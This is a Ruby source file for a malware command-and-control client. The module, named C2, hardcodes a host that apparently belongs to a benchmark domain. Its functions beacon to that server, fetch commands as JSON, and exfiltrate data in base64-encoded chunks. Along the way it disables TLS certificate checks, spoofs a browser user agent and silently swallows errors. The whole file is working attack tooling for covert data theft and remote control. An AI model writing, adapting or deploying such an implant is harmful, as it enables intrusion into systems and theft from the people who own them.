require 'net/http'
require 'uri'
require 'json'
require 'base64'
require 'openssl'
require 'socket'
require 'etc'
require 'pathname'
require 'time'
require 'digest'
require 'zlib'
require 'securerandom'

module C2
  C2_HOST = 'freebsd-ruby-obfuscation-financial-interpreter-c8a4b.benchmark.atomdrift.org'
  C2_PORT = 443
  USER_AGENT = 'Mozilla/5.0 (compatible; FreeBSD/14.0; Ruby/' + RUBY_VERSION + ')'
  BEACON_INTERVAL = 30

  class << self
    def beacon(session_id, payload)
      uri = URI("https://#{C2_HOST}/api/v1/beacon")
      uri.port = C2_PORT

      envelope = {
        sid: session_id,
        ts: Time.now.to_i,
        data: Base64.strict_encode64(payload.to_s),
        nonce: SecureRandom.hex(16)
      }

      req = Net::HTTP::Post.new(uri)
      req['Content-Type'] = 'application/octet-stream'
      req['User-Agent'] = USER_AGENT
      req['X-Session'] = session_id
      req.body = envelope.to_json

      http = Net::HTTP.new(uri.host, uri.port)
      http.use_ssl = true
      http.verify_mode = OpenSSL::SSL::VERIFY_NONE
      http.read_timeout = 15
      http.open_timeout = 10

      begin
        http.request(req)
      rescue => e
        nil
      end
    end

    def fetch_commands(session_id)
      uri = URI("https://#{C2_HOST}/api/v1/commands")
      uri.port = C2_PORT

      req = Net::HTTP::Get.new(uri)
      req['User-Agent'] = USER_AGENT
      req['X-Session'] = session_id
      req['Accept'] = 'application/json'

      http = Net::HTTP.new(uri.host, uri.port)
      http.use_ssl = true
      http.verify_mode = OpenSSL::SSL::VERIFY_NONE
      http.read_timeout = 15
      http.open_timeout = 10

      begin
        resp = http.request(req)
        return nil unless resp.code == '200'
        JSON.parse(resp.body)
      rescue => e
        nil
      end
    end

    def exfiltrate(session_id, data)
      uri = URI("https://#{C2_HOST}/api/v1/exfil")
      uri.port = C2_PORT

      chunks = data.each_slice(4096).to_a
      chunks.each_with_index do |chunk, idx|
        envelope = {
          sid: session_id,
          part: idx,
          total: chunks.length,
          payload: Base64.strict_encode64(chunk.to_s)
        }

        req = Net::HTTP::Post.new(uri)
        req['Content-Type'] = 'application/octet-stream'
        req['User-Agent'] = USER_AGENT
        req['X-Session'] = session_id
        req['X-Part'] = idx.to_s
        req.body = envelope.to_json

        http = Net::HTTP.new(uri.host, uri.port)
        http.use_ssl = true
        http.verify_mode = OpenSSL::SSL::VERIFY_NONE
        http.open_timeout = 10

        begin
          http.request(req)
        rescue => e
          nil
        end
      end
    end
  end
end
